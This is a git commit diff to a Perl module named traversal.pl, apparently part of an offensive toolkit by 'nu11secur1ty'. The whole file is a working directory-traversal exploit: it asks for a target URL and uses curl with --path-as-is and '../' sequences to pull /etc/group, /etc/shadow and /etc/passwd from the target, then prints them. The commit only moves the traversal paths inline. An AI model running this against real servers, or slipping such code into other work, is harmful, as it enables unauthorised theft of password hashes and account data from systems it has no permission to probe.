5604382e4a4eb25d4ece84bfff93c6c2eb3af56b
nu11secur1ty <venvaropt@gmail.com>
2020-04-19 09:32:40 +0300

    Update traversal.pl

--- program/modules/traversal.pl
+++ program/modules/traversal.pl
@@ -6,13 +6,10 @@ use diagnostics;
 
 print "Give URL target for example: http://localhost:8080/\n";
 chomp (my $URL_target = <STDIN>);
-	chomp (my $target_mode1 = "../../../../../../etc/group");
-	chomp (my $target_mode2 = "../../../../../../etc/shadow");
-	chomp (my $target_mode3 = "../../../../../../etc/passwd");
 my @attack_m0de = (
-		[my $m1 = `curl --path-as-is $URL_target$target_mode1`], 
-		[my $m2 = `curl --path-as-is $URL_target$target_mode2`], 
-		[my $m3 = `curl --path-as-is $URL_target$target_mode3`]
+		[my $m1 = `curl --path-as-is $URL_target../../../../../../etc/group`], 
+		[my $m2 = `curl --path-as-is $URL_target../../../../../../etc/shadow`], 
+		[my $m3 = `curl --path-as-is $URL_target../../../../../../etc/passwd`]
 );
 print "$attack_m0de[0][0]\n";
 print "$attack_m0de[1][0]\n";
